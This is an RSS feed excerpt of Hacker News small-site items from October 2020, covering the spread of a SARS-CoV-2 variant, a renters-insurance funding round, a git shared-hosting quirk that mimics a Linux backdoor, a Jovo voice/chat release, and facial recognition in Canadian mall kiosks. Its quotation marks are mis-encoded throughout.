<strong>In terms of technology...</strong>Biden‚Äôs position looks more attractive, though some moments look contradictory.</p><p>

His support of small and mid-sized tech businesses can improve the consumer welfare standard and maintain greater competition in the marketplace.&nbsp;</p><p>

At the same time, tech giants like Amazon, Google, Facebook, and others have contributed a lot to the U.S. economy, and if they face some strict regulations, it may lead to some countermeasures from their side (e.g. moving offices to ‚Ä¶</p></div></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://grinteq.com/blog/trump-vs-biden-whose-side-is-ecommerce-on">https://grinteq.com/blog/trump-vs-biden-whose-side-is-ecommerce-on</a></em></p>]]>
            </description>
            <link>https://grinteq.com/blog/trump-vs-biden-whose-side-is-ecommerce-on</link>
            <guid isPermaLink="false">hacker-news-small-sites-24933119</guid>
            <pubDate>Thu, 29 Oct 2020 17:50:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spread of a novel SARS-CoV-2 variant across Europe in summer 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932985">thread link</a>) | @jcfrei
<br/>
October 29, 2020 | https://www.unibas.ch/en/News-Events/News/Uni-Research/Spread-of-a-novel-SARS-CoV-2-variant-across-Europe-in-summer-2020.html | <a href="https://web.archive.org/web/*/https://www.unibas.ch/en/News-Events/News/Uni-Research/Spread-of-a-novel-SARS-CoV-2-variant-across-Europe-in-summer-2020.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    


    <div>
        <p>In Europe alone, hundreds of different variants of the new coronavirus SARS-CoV-2 are currently circulating, distinguished by mutations in their genomes. However, only very few of these variants have spread as successfully and become as prevalent as the newly identified variant, named <em>20A.EU1</em>.</p>

<p>The researchers at the University of Basel, ETH Z√ºrich in Basel and the SeqCOVID-Spain consortium analyzed and compared virus genome sequences collected from Covid-19 patients all across Europe to trace the evolution and spread of the pathogen (see box). Their analysis suggests that the variant originated in Spain during the summer. The earliest evidence of the new variant is linked to a super-spreading event among agricultural workers in the north-east of Spain. The variant moved into the local population, expanding quickly across the country, and now accounts for almost 80% of the sequences from Spain.</p>

<p>‚ÄúIt is important to note that there is currently no evidence the new variant‚Äôs spread is due to a mutation that increases transmission or impacts clinical outcome,‚Äù stresses Dr. Emma Hodcroft of the University of Basel, lead author of the study. The researchers believe that the variant‚Äôs expansion was facilitated by loosening travel restrictions and social distancing measures in summer.</p>

<h4><strong>Similar pattern as in spring in Spain</strong></h4>

<p>‚ÄúWe see a similar pattern with this variant in Spain as we did in the spring,‚Äù advises Professor I√±aki Comas, co-author on the paper and head of the SeqCOVID-Spain consortium. ‚ÄúOne variant, aided by an initial super-spreading event, can quickly become prevalent across the country.‚Äù</p>

<p>From July, <em>20A.EU1</em> moved with travelers as borders opened across Europe, and has now been identified in twelve European countries. It has also been transmitted from Europe to Hong Kong and New Zealand. While initial introductions of the variant were likely from Spain directly, the variant may then have continued to spread onward from secondary countries.</p>

<p>Currently, <em>20A.EU1</em> accounts for 90% of sequences from the UK, 60% of sequences from Ireland, and between 30 and 40% of sequences in Switzerland and the Netherlands. This makes this variant currently one of the most prevalent in Europe. It has also been identified in France, Belgium, Germany, Italy, Latvia, Norway, and Sweden.</p>

<h4><strong>Travel facilitated the spread</strong></h4>

<p>Genetic analysis indicates that the variant travelled at least dozens and possibly hundreds of times between European countries. ‚ÄúWe can see the virus has been introduced multiple times in several countries and many of these introductions have gone on to spread through the population,‚Äù says Professor Tanja Stadler of ETH Z√ºrich, one of the study‚Äôs principal investigators, ‚ÄúThis isn‚Äôt a case of one introduction just happening to do well.‚Äù</p>

<p>Though the rise in prevalence of <em>20A.EU1</em> corresponds with the increasing number of cases observed in many European countries this autumn, the study‚Äôs authors caution against interpreting the new variant as a cause for the rise in cases. ‚ÄúIt is not the only variant circulating in recent weeks and months,‚Äù says Professor Richard Neher of the University of Basel, one of the study‚Äôs principal investigators. ‚ÄúIndeed, in some countries with significant increases in Covid-19 cases, like Belgium and France, other variants are prevalent.‚Äù</p>

<p>Analysis of the summertime SARS-CoV-2 prevalence in Spain and travel data show that these factors may explain how <em>20A.EU1</em> spread so successfully. Spain‚Äôs relatively high number of cases and popularity as a holiday destination may have allowed multiple opportunities for introductions, some of which may have grown into larger outbreaks through risky behaviors after returning home.</p>

<p>The study‚Äôs authors highlight the importance of evaluating how border controls and travel restrictions worked in containing SARS-CoV-2 transmissions over the summer, and the role travel has played. ‚ÄúLong-term border closures and severe travel restrictions aren‚Äôt feasible or desirable,‚Äù explains Hodcroft, ‚Äúbut from the spread of <em>20A.EU1</em> it seems clear that the measures in place were often not sufficient to stop onward transmission of introduced variants this summer. When countries have worked hard to get SARS-CoV-2 cases down to low numbers, identifying better ways to ‚Äòopen up‚Äô without risking a rise in cases is critical.‚Äù</p>

<h4><strong>Assessing the phenotype of the new variant</strong></h4>

<p>The new variant was first identified by Hodcroft during an analysis of Swiss sequences using the ‚ÄòNextstrain‚Äô platform, developed jointly by the University of Basel and the Fred Hutchinson Cancer Research center in Seattle, Washington. <em>20A.EU1</em> is characterized by mutations that modify amino-acids in the spike, nucleocapsid, and ORF14 proteins of the virus.</p>

<p>Though the present state of knowledge does not indicate <em>20A.EU1</em>‚Äôs spread was due to a change in transmissibility, the authors are currently working with virology labs to examine any potential impact the spike mutation, known as S:A222V, may have on the SARS-CoV-2 virus‚Äô phenotype. They also hope to soon receive access to data that would allow them to assess any clinical implications of the variant.</p>

<p>Also, the study‚Äôs authors emphasize the importance of monitoring the rise of new variants like <em>20A.EU1</em> closely: ‚ÄúIt is only through sequencing the viral genome that we can identify new SARS-CoV-2 variants when they arise and monitor their spread within and between countries,‚Äù adds Neher, ‚ÄúBut the number of sequences we have varies widely between countries, and we might be able to identify rising variants sooner with faster and more regular sequencing efforts across Europe.‚Äù</p>

<p><em>A high-resolution image is available in the <a href="https://www.unibas.ch/en/News-Events/Media-Database.html">media database</a>.</em></p>

    </div>
</div><section>
    
    <div>
    	<p>The ‚ÄòNextstrain‚Äô platform was started in 2015 with the goal of allowing real-time tracking of pathogens via genetic sequencing and hoping to help forecast the future spread of viruses. Nextstrain takes advantage of the small mistakes viruses make when they replicate: The platform creates a ‚Äòfamily tree‚Äô that shows how different samples are related. This allows scientists to track how viruses spread around the world and through time. Nextstrain has been applied to many pathogens, including those that cause influenza, Zika, Ebola, Tuberculosis, and of course, Covid-19. The Neher lab at the University of Basel currently maintains the Nextstrain analyses of SARS-CoV-2 sequences for most countries in Europe as well as a dedicated analysis for Switzerland.</p>

<p>The SeqCOVID-Spain consortium is aimed to understand the transmission patterns of SARS-CoV-2 in Spain and in connection with the rest of the world. It is contributed by more than 30 clinical institutions to get a nationwide representation of the viral diversity.</p>

    </div>
</section><div>
    


        <div>
            <p><strong>Original publication</strong></p>

<p>Emma B. Hodcroft, Moira Zuber, Sarah Nadeau, I√±aki Comas, Fernando Gonzalez Candelas, SeqCOVID-SPAIN consortium, Tanja Stadler and Richard A. Neher<br>
<a href="https://www.medrxiv.org/content/10.1101/2020.10.25.20219063v1" target="_blank">Spread of a SARS-CoV-2 variant through Europe in summer 2020</a><br>
medRxiv (2020), DOI: 10.1101/2020.10.25.20219063</p>



<p><strong>Further information</strong></p>

<p>Dr. Emma Hodcroft, University of Basel, Biozentrum, email: <a href="mailto:emma.hodcroft@unibas.ch">emma.hodcroft@unibas.ch</a> (fast response time, please email to schedule a call)</p>

<p>Prof. Dr. Tanja Stadler, ETH Z√ºrich, Department of Biosystems Science and Engineering, phone <a href="tel:+41 61 387 34 10">+41 61 387 34 10</a>, email: <a href="mailto:tanja.stadler@bsse.ethz.ch">tanja.stadler@bsse.ethz.ch</a></p>

<p>Prof. Dr. I√±aki Comas Espadas, Biomedicine Institute of Valencia (IBV), Spanish Research Council (CSIC), phone <a href="tel:+34 96 339 3773">+34 96 339 3773</a>, email: <a href="mailto:icomas@ibv.csic.es">icomas@ibv.csic.es</a></p>

        </div>

</div></div>]]>
            </description>
            <link>https://www.unibas.ch/en/News-Events/News/Uni-Research/Spread-of-a-novel-SARS-CoV-2-variant-across-Europe-in-summer-2020.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932985</guid>
            <pubDate>Thu, 29 Oct 2020 17:37:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodcover's (YC S17) Series A Funding: Accelerating Affordable Renters Insurance]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24932805">thread link</a>) | @ddispaltro
<br/>
October 29, 2020 | https://www.goodcover.com/blog/goodcovers-series-a-funding-accelerating-affordable-renters-insurance-offering-in-california-and-beyond/ | <a href="https://web.archive.org/web/*/https://www.goodcover.com/blog/goodcovers-series-a-funding-accelerating-affordable-renters-insurance-offering-in-california-and-beyond/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>At Goodcover, our mission is to elevate financial peace of mind with affordable and effective insurance for all. We <a href="https://www.goodcover.com/blog/announcing-goodcover-renters-insurance/">launched</a> earlier this year with our first product, modern renters insurance. Today we‚Äôre announcing funding that will accelerate delivering on that mission.</p><p>Our $7.5M Series A financing is led by Goodwater Capital, with participation from Fuel Capital, Broadhaven Ventures, Global Founders Capital, Liquid 2, and TransRe. We‚Äôre especially thrilled to collaborate with the team at Goodwater and their dedicated background in consumer technology who‚Äôve helped fund companies such as Monzo, ZeroDown, and Zumper.</p><h2 id="next-step-bring-affordable-renters-insurance-to-more-states">Next Step: bring affordable renters insurance to more states</h2><p>Today, Goodcover‚Äôs renters insurance is only available in California. With this funding we will begin to roll out nationally, helping to bring affordable, effective financial peace of mind to as many people as possible. &nbsp;</p><p>Getting Goodcover launched in one state was a huge process (for gory details read <a href="https://news.ycombinator.com/item?id=22368112">this HN post</a>), but fortunately that was the heavy lifting. While we plan to eventually be available in all 50 states, launching an insurance offering in each one is a separate process - especially with a novel cooperative model like ours - so we‚Äôll be announcing them as soon we can. &nbsp;</p><p>If you want to be notified when Goodcover starts up in your state, please <a href="http://www.goodcover.com/join">click here</a> to drop in your zip and email to let us know.</p><p>PS - I‚Äôve focused on the fact that we‚Äôll roll out renters in more states, but the truth is our mission demands that we offer more than just renters Insurance. We are working on home and condo as well, and evaluating opportunities in auto and life insurances, so stay tuned.</p><h2 id="member-cooperative-the-fair-model">Member Cooperative: The Fair Model</h2><p>Critical to our success has been our relationship with Goodcover Members - and this starts with our cooperative model that makes insurance fairer and more approachable. As promised when we launched, after a fixed fee we take only what‚Äôs needed to cover claims, returning the rest back to members. &nbsp;This is how insurance began - neighbors protecting neighbors - but it is a foreign concept in insurance today. The model works and we‚Äôve proudly returned 1.89% of premium through our <a href="https://www.goodcover.com/blog/2020-member-dividend/">Member Dividend this year</a>. </p><p>Members who don‚Äôt want to keep the funds returned to them have the option of contributing them to our Goodpool fund, which is used for good ‚Äì such as offering <a href="https://www.goodcover.com/blog/free-insurance-for-medical-responders-covid19/">free insurance to medical and other frontline workers fighting COVID-19</a>.</p><h2 id="introducing-the-goodprice-guarantee">Introducing the Goodprice Guarantee</h2><p>It‚Äôs also no secret that a large part of Goodcover‚Äôs popularity has been the ‚Äúaffordable‚Äù part of our mission. On average we are 48% less expensive than legacy providers, but we‚Äôve clocked up to 72% less! We‚Äôve done the work to create efficient, affordable, modern insurance -- we have no middlemen, no agents, no paperwork, no superbowl ads -- we‚Äôve cut out waste with a streamlined digital experience and passed the savings on to members. </p><p>That said, if you have never heard of Goodcover before and are checking us out for the first time, it‚Äôs hard to know whether you are getting a good deal, or whether there‚Äôs some sort of gotcha. Well, you are, and there isn‚Äôt - but it‚Äôs our job to prove it to you. &nbsp;We get it, it‚Äôs easy to get overwhelmed browsing sales ridden comparison sites that look to complicate a pretty simple thing.</p><p>So, we‚Äôre introducing the Goodprice Guarantee. If after joining, you find a better deal somewhere else, simply send us your new policy offer - we‚Äôll refund your Goodcover premium fully. </p><h2 id="hiring-join-us-">Hiring! Join Us.</h2><p>We‚Äôve got a lot to do, so we‚Äôre going to need help! Join our all-remote team, we‚Äôre looking for: <a href="https://angel.co/company/goodcover-co/jobs/1038060-design-lead">Design Lead</a>, <a href="https://angel.co/company/goodcover-co/jobs/299516-senior-backend-engineer">Senior Backend Engineer</a>, <a href="https://angel.co/company/goodcover-co/jobs/1038024-senior-frontend-engineer">Senior Frontend Engineer</a>, licensed agents to support the Member Experience, Growth Marketers, and everything in between. If you don‚Äôt see a specific role open send us a note to <a href="mailto:careers@goodcover.com">careers@goodcover.com</a>.</p><h2 id="get-covered">Get Covered</h2><p>Finally, our continual PSA: if you‚Äôve never had renters insurance there‚Äôs no better time to start than today (especially given the tragic wildfires that ravaged the west coast). It starts at $5 a month, you can cancel anytime, it takes only a few minutes (record time is 57 seconds!)... There is no reason not to have it, yet we see so many people who are not protected. Please get it, if not with us, with someone, to protect yourself and your family from unnecessary pain.</p><p>If you‚Äôre insured already, send us your policy to <a href="mailto:compare@goodcover.com">compare@goodcover.com</a> and we‚Äôll send you back a detailed coverage comparison showing you how much you can save. If you like what you see, you can join instantly, and we‚Äôll do the work of cancelling and refunding your old policy for you.</p><h2 id="thank-you-members-thank-you-team">Thank you members, thank you team</h2><p>This is a big day for Goodcover - I am so thankful for all the hard work and persistence of the team and everything you have done so far - and I am excited for what we‚Äôll do next.</p><p>And to Goodcover Members - thank you for trusting us with your insurance. We know it‚Äôs an act of faith to contribute your real hard earned money in exchange for the promise that we‚Äôll be there when you need us. We‚Äôll make you proud!<br></p><p>Chris Lotz</p><p>CEO and co-founder</p></div></div></div>]]>
            </description>
            <link>https://www.goodcover.com/blog/goodcovers-series-a-funding-accelerating-affordable-renters-insurance-offering-in-california-and-beyond/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932805</guid>
            <pubDate>Thu, 29 Oct 2020 17:20:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Git Shared Hosting Quirk]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932793">thread link</a>) | @zdw
<br/>
October 29, 2020 | https://daniel-lange.com/archives/165-Git-shared-hosting-quirk.html | <a href="https://web.archive.org/web/*/https://daniel-lange.com/archives/165-Git-shared-hosting-quirk.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
    
        <nav id="primary-nav">
        

        <ul><li><a href="https://daniel-lange.com/">Blog</a></li><li><a href="https://daniel-lange.com/pages/software.html">Software</a></li><li><a href="https://daniel-lange.com/pages/contact.html">Contact</a></li></ul>
    </nav>
        <div>
        <main id="content">
        
            <article id="post_165">
        <header>
            <h2><a href="https://daniel-lange.com/archives/165-Git-shared-hosting-quirk.html">Git shared hosting quirk</a></h2>

            
        </header>

        <div>
        <p><a href="https://daniel-lange.com/categories/2-IT"><img title="IT: Information Technology" alt="IT" src="https://daniel-lange.com/uploads/IT.serendipityThumb.jpg"></a></p><p>Show <a href="https://github.com/torvalds/linux/blob/b4061a10fc29010a610ff2b5b20160d7335e69bf/drivers/hid/hid-samsung.c#L113-L118">https://github.com/torvalds/linux/blob/b4061a10fc29010a610ff2b5b20160d7335e69bf/drivers/hid/hid-samsung.c#L113-L118</a> to a friend.</p>

<p>Oops 'eh? Yep, Linux has been backdoored.</p>

<p>Well, or not.</p>

<p><a href="https://mricon.com/">Konstantin Ryabitsev</a> explains it nicely in a <a href="https://lists.zx2c4.com/pipermail/cgit/2020-October/004571.html">cgit mailing list email</a>:</p>

<blockquote>
It is common for git hosting environments to configure all forks of the
same repo to use an "object storage" repository. For example, this is
what allows git.kernel.org's 600+ forks of linux.git to take up only
10GB on disk as opposed to 800GB.

One of the side-effects of this setup is that any object in the shared
repository can be accessed from any of the forks, which periodically
confuses people into believing that something terrible has happened.
</blockquote>

<p>The hack was <a href="https://github.com/torvalds/linux/commit/b4061a10fc29010a610ff2b5b20160d7335e69bf#diff-b2b8b8422630002a41cf5901247f9a6af2cc8d000fc792ef7aae9ea1f393f8b4">discussed on Github in Dec 2018</a> 
when it was discovered. I forgot about it again but Konstantin's mail brought the memory back and I think it deserves more attention.</p>

<p>I'm sure putting some illegal content into a fork and sending a made up "blob" URL to law enforcement would go quite far.
Good luck explaining the issue. <i>"Yes this is my repo"</i> but <i>"no, no that's not my data"</i> ... <i>"yes, it <u>is</u> my repo but not my data"</i> ... <i>"no we don't want that data either, really"</i> ... <i>"but, but there is nothing we can do, we host on github...<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>"</i>.</p>



                </div>
                
        

        <!--
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
                 xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
                 xmlns:dc="http://purl.org/dc/elements/1.1/">
        <rdf:Description
                 rdf:about="https://daniel-lange.com/feeds/ei_165.rdf"
                 trackback:ping="https://daniel-lange.com/comment.php?type=trackback&amp;entry_id=165"
                 dc:title="Git shared hosting quirk"
                 dc:identifier="https://daniel-lange.com/archives/165-Git-shared-hosting-quirk.html" />
        </rdf:RDF>
        -->

                                            
        

        
            <a id="feedback"></a>
                        

        
    </article>
        



        </main>
                
        </div>

    
</div></div>]]>
            </description>
            <link>https://daniel-lange.com/archives/165-Git-shared-hosting-quirk.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932793</guid>
            <pubDate>Thu, 29 Oct 2020 17:18:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Fexprs and Defmacro]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 10 (<a href="https://news.ycombinator.com/item?id=24932701">thread link</a>) | @sea6ear
<br/>
October 29, 2020 | https://www.brinckerhoff.org/scraps/joe-marshall-on-FEXPRS-and-DEFMACRO.txt | <a href="https://web.archive.org/web/*/https://www.brinckerhoff.org/scraps/joe-marshall-on-FEXPRS-and-DEFMACRO.txt">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.brinckerhoff.org/scraps/joe-marshall-on-FEXPRS-and-DEFMACRO.txt</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932701</guid>
            <pubDate>Thu, 29 Oct 2020 17:09:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Open-source, fully customizable voice and chat widgets for the web]]>
            </title>
            <description>
<![CDATA[
Score 73 | Comments 16 (<a href="https://news.ycombinator.com/item?id=24932588">thread link</a>) | @JanKoenig
<br/>
October 29, 2020 | https://www.jovo.tech/news/2020-10-29-jovo-for-web-v3-2 | <a href="https://web.archive.org/web/*/https://www.jovo.tech/news/2020-10-29-jovo-for-web-v3-2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p><a href="#" data-featherlight="/img/news/2020-10-29-jovo-for-web-v3-2/jovo-for-web.jpg"><img src="https://www.jovo.tech/img/news/2020-10-29-jovo-for-web-v3-2/jovo-for-web.jpg" alt="Jovo for Web Open Source Voice and Chat" title="Introducing Jovo for Web: Customizable Voice and Chat for the Browser"></a></p><p>With the release <code>v3.2</code> of the <a href="https://github.com/jovotech/jovo-framework">Jovo Framework</a>, we're excited to present a completely revamped web integration.</p><p><em>Jovo for Web</em> allows you to build fully customizable voice and chat apps that work in the browser. And it even comes with 4 open source templates (gifs below!) that help you get started.</p><ul>
<li><a href="#jovo-for-web-features">Jovo for Web Features</a></li>
<li><a href="#select-from-4-starter-templates">Select from 4 Starter Templates</a>
<ul>
<li><a href="#standalone-voice-experience">Standalone Voice Experience</a></li>
<li><a href="#voice-overlay">Voice Overlay</a></li>
<li><a href="#chat-widget">Chat Widget</a></li>
<li><a href="#embedded-chat">Embedded Chat</a></li>
</ul></li>
<li><a href="#more-new-features">More New Features</a></li>
<li><a href="#how-to-update">How to Update</a>
<ul>
<li><a href="#breaking-changes">Breaking Changes</a></li>
</ul></li>
<li><a href="#a-big-thank-you">A Big Thank You</a></li>
</ul><p><em>Like what we're doing? <a href="https://opencollective.com/jovo-framework">Support us on Open Collective!</a></em> </p><h2 id="jovo-for-web-features"><a href="#jovo-for-web-features">Jovo for Web Features</a></h2><p>Let's build voice and chat apps for the browser!</p><p>In our <a href="https://www.context-first.com/introducing-jovo-v3-the-voice-layer/">v3 announcement</a>, we already mentioned that Jovo works with web apps and websites thanks to the <a href="https://www.context-first.com/introduction-voice-multimodal-interactions/">RIDR Lifecycle</a> and <a href="https://www.jovo.tech/news/www.jovo.tech/marketplace">Jovo Marketplace</a>.</p><p><a href="#" data-featherlight="/img/news/2020-10-29-jovo-for-web-v3-2/jovo-web-ridr-lifecycle.jpg"><img src="https://www.jovo.tech/img/news/2020-10-29-jovo-for-web-v3-2/jovo-web-ridr-lifecycle.jpg" alt="Jovo for Web RIDR Lifecycle" title="Integrate ASR and NLU into Web Apps with Jovo and RIDR"></a></p><p>Today, we're thrilled to announce a completely improved verson of our <strong>Jovo for Web</strong> platform.</p><p>Features include:</p><ul>
<li>Support for speech, text, and touch input</li>
<li>Multimodal: Complex visual and audio output possible</li>
<li>Open source and fully customizable</li>
<li><a href="#select-from-4-starter-templates">4 starter templates</a> built with modern technologies like Vue.js and Tailwind CSS</li>
</ul><p>We can't wait to see and hear what you build with this!</p><h2 id="select-from-4-starter-templates"><a href="#select-from-4-starter-templates">Select from 4 Starter Templates</a></h2><p>To help you get started quickly, we built 4 templates with Vue.js and Tailwind CSS that implement use cases for both voice and chat.</p><h3 id="standalone-voice-experience"><a href="#standalone-voice-experience">Standalone Voice Experience</a></h3><blockquote>
<p>Find this starter on GitHub: <a href="https://github.com/jovotech/jovo-starter-web-standalone">github.com/jovotech/jovo-starter-web-standalone</a></p>
</blockquote><p><a href="#" data-featherlight="/img/news/2020-10-29-jovo-for-web-v3-2/starter-web-standalone.gif"><img src="https://www.jovo.tech/img/news/2020-10-29-jovo-for-web-v3-2/starter-web-standalone.gif" alt="Jovo Starter: Standalone Voice Experience" title="Introducing Jovo for Web: Customizable Voice and Chat in the Browser"></a></p><p>This starter brings your voice experiences into the browser as a standalone web app. This can be seen as an experience equivalent to a smart display. Many Alexa Skills and Google Actions like voice games can be brought to the web using this template.</p><p>The starter includes:</p><ul>
<li>a push-to-talk button</li>
<li>a display of the transcribed speech above the button</li>
<li>app output at the top of the screen</li>
<li>conversational logic that switches to dark/light mode using custom web actons</li>
</ul><p><a href="https://www.jovo.tech/demos/starter-web-standalone">Check out the demo here!</a> Hold the button and say "<em>switch to dark mode.</em>"</p><h3 id="voice-overlay"><a href="#voice-overlay">Voice Overlay</a></h3><blockquote>
<p>Find this starter on GitHub: <a href="https://github.com/jovotech/jovo-starter-web-overlay">github.com/jovotech/jovo-starter-web-overlay</a></p>
</blockquote><p><a href="#" data-featherlight="/img/news/2020-10-29-jovo-for-web-v3-2/starter-web-overlay.gif"><img src="https://www.jovo.tech/img/news/2020-10-29-jovo-for-web-v3-2/starter-web-overlay.gif" alt="Jovo Starter: Voice Overlay" title="Introducing Jovo for Web: Customizable Voice and Chat in the Browser"></a></p><p>This starter adds a speech input button as an overlay to an existing website or web app. Voice interactions like search, customizations, and deep access of features could be added using the overlay.</p><p>The starter includes:</p><ul>
<li>a push-to-talk button</li>
<li>a display of the transcribed speech left to the button</li>
<li>conversational logic that switches to dark/light mode using custom web actons</li>
</ul><p><a href="https://www.jovo.tech/demos/starter-web-overlay">Check out the demo here!</a> Hold the button and say "<em>switch to dark mode.</em>"</p><h3 id="chat-widget"><a href="#chat-widget">Chat Widget</a></h3><blockquote>
<p>Find this starter on GitHub: <a href="https://github.com/jovotech/jovo-starter-web-chatwidget">github.com/jovotech/jovo-starter-web-chatwidget</a></p>
</blockquote><p><a href="#" data-featherlight="/img/news/2020-10-29-jovo-for-web-v3-2/starter-web-chatwidget.gif"><img src="https://www.jovo.tech/img/news/2020-10-29-jovo-for-web-v3-2/starter-web-chatwidget.gif" alt="Jovo Starter: Open Source Chat Widget" title="Introducing Jovo for Web: Customizable Voice and Chat in the Browser"></a></p><p>This starter adds a classic chat widget to your website. Think chatbots and conversational experiences for customer support and more.</p><p>The starter includes:</p><ul>
<li>a bottom-right toggle button</li>
<li>text input and quick replies</li>
<li>conversational logic that asks the user to open the Jovo Docs (redirect not working on iOS due to platform limitations)</li>
</ul><p><a href="https://www.jovo.tech/demos/starter-web-chatwidget">Check out the demo here!</a></p><h3 id="embedded-chat"><a href="#embedded-chat">Embedded Chat</a></h3><blockquote>
<p>Find this starter on GitHub: <a href="https://github.com/jovotech/jovo-starter-web-embeddedchat">github.com/jovotech/jovo-starter-web-embbeddedchat</a></p>
</blockquote><p><a href="#" data-featherlight="/img/news/2020-10-29-jovo-for-web-v3-2/starter-web-embeddedchat.gif"><img src="https://www.jovo.tech/img/news/2020-10-29-jovo-for-web-v3-2/starter-web-embeddedchat.gif" alt="Jovo Starter: Open Source Embedded Chat" title="Introducing Jovo for Web: Customizable Voice and Chat in the Browser"></a></p><p>This starter adds a customizable chat interface to your website that can be used for things like conversational landing pages, FAQs, mobile chat support, and much more.</p><p>The starter includes:</p><ul>
<li>fullsize chat component that can be embedded into an existing website</li>
<li>text input and quick replies</li>
<li>conversational logic that asks the user to open the Jovo Docs (redirect not working on iOS due to platform limitations)</li>
</ul><p><a href="https://www.jovo.tech/demos/starter-web-embeddedchat">Check out the demo here!</a></p><h2 id="more-new-features"><a href="#more-new-features">More New Features</a></h2><p>Alongside the big launch of Jovo for Web, we also shipped some other improvements and bug fixes with the help of our community. <a href="https://github.com/jovotech/jovo-framework/blob/master/CHANGELOG.md">You can find the full changelog here</a>.</p><ul>
<li>We released Google Conversational Actions. <a href="https://www.jovo.tech/news/2020-10-08-google-conversational-actions-builder">Find the announcement here</a>.</li>
<li>New analytics integration: <a href="https://www.jovo.tech/marketplace/jovo-analytics-onedash">OneDash</a>. <em>Thanks to <a href="https://github.com/StepanU">StepanU</a>!</em></li>
<li><a href="https://github.com/jovotech/jovo-framework/pull/838">Dialogflow Genesys integration</a>. <em>Thanks to <a href="https://github.com/dominik-meissner">Dominik Meissner</a>!</em></li>
</ul><h2 id="how-to-update"><a href="#how-to-update">How to Update</a></h2><blockquote>
<p><a href="https://www.jovo.tech/docs/installation/upgrading">Learn more in the Jovo Upgrading Guide</a>.</p>
</blockquote><p>To update to the latest version of Jovo, use the following commands:</p><h3 id="breaking-changes"><a href="#breaking-changes">Breaking Changes</a></h3><p>The "Jovo Web Client" and "Jovo Web Platform" were completely refactored for this release.</p><h2 id="a-big-thank-you"><a href="#a-big-thank-you">A Big Thank You</a></h2><p>Thanks a lot to all the contributors of this release. Everyone of the Jovo core team worked together to make this happen! Special thanks to Max who started working on the web integration more than a year ago as part of his bachelor's thesis.</p><p>Community and core contributors:</p><ul>
<li><a href="https://github.com/StepanU">StepanU</a></li>
<li><a href="https://github.com/dominik-meissner">Dominik Meissner</a></li>
<li><a href="https://github.com/rubenaeg">Ruben Aegerter</a></li>
<li><a href="https://github.com/KaanKC">Kaan Kilic</a></li>
<li><a href="https://github.com/m-ripper">Max Ripper</a></li>
<li><a href="https://github.com/aswetlow">Alex Swetlow</a></li>
</ul><p>And to everyone else who helped with ideas and feature requests in the <a href="https://www.jovo.tech/slack">Jovo Slack</a> and <a href="https://community.jovo.tech/">Jovo Community Forum</a>!</p>
</article></div>]]>
            </description>
            <link>https://www.jovo.tech/news/2020-10-29-jovo-for-web-v3-2</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932588</guid>
            <pubDate>Thu, 29 Oct 2020 16:59:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[5M Canadian shoppers' images collected at mall kiosks]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932467">thread link</a>) | @anonymousab
<br/>
October 29, 2020 | https://www.ctvnews.ca/canada/5-million-canadian-shoppers-images-collected-at-mall-kiosks-privacy-commissioner-1.5166162 | <a href="https://web.archive.org/web/*/https://www.ctvnews.ca/canada/5-million-canadian-shoppers-images-collected-at-mall-kiosks-privacy-commissioner-1.5166162">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>OTTAWA -- 
	Without customers‚Äô knowledge, more than five million images of Canadian shoppers were collected through facial recognition software used by Cadillac Fairview, a parent company of malls across the country, <a href="https://www.priv.gc.ca/en/opc-actions-and-decisions/investigations/investigations-into-businesses/2020/pipeda-2020-004/" target="_blank">according to an investigation by privacy officials.</a></p>
<p>
	The federal privacy commissioner reported Thursday that Cadillac Fairview contravened federal and provincial privacy laws by embedding cameras inside digital information kiosks at 12 shopping malls across Canada, and captured users‚Äô images without their consent.</p>
<p>
	The facial recognition software installed in Cadillac Fairview‚Äôs ‚Äúwayfinding‚Äù directories was called ‚ÄúAnonymous Video Analytics (AVA) and through cameras installed behind protective glass, was used in Canadian malls for a brief testing period in 2017 and then was in-use between May and July of 2018.</p>
<p>
	The software took temporary digital images of the faces of any individual within the field of view of the camera inside the directory and converted the images into biometric numerical representations of each face and used that information to compile demographic information about mall visitors.</p>
<p>
	According to the report, the technology was used in directories at the following locations:</p>
<ul>
	<li>
		CF Market Mall in Alberta</li>
	<li>
		CF Chinook Centre in Alberta</li>
	<li>
		CF Richmond Centre in British Columbia</li>
	<li>
		CF Pacific Centre in British Columbia</li>
	<li>
		CF Polo Park in Manitoba</li>
	<li>
		CF Toronto Eaton Centre in Ontario</li>
	<li>
		CF Sherway Gardens in Ontario</li>
	<li>
		CF Lime Ridge in Ontario</li>
	<li>
		CF Fairview Mall in Ontario</li>
	<li>
		CF Markville Mall in Ontario</li>
	<li>
		CF Galeries d‚ÄôAnjou in Quebec</li>
